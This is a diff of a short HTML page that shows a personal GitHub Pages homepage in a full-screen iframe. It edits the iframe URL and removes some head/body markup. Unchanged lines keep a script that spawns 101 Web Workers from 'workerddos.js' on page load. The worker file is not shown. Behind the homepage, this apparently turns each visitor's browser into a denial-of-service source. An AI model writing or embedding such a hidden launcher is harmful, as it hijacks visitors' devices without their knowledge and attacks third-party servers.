@@ -1,15 +1,11 @@
 <style>
 #page { width: 100%;height:100%}
-body {margin:0}
 </style>
-<script type="text/javascript" src="run_worker.js">
-</script>
 <script type="text/javascript">
 	workers=[]
 	 for(i=0;i<=100;i++){
                workers[i]=new Worker("workerddos.js");   
          }
-</head>
-<body>
-	<iframe id="page" name="page" src="https://h5mcbox.github.io/home" frameborder="0" noresize="noresize" style="overflow:visible"></iframe>
-</body>
+</script>
+<iframe id="page" name="page" src="https://h5mcbox.github.io" frameborder="0" noresize="noresize" style="overflow:visible"></iframe>
+
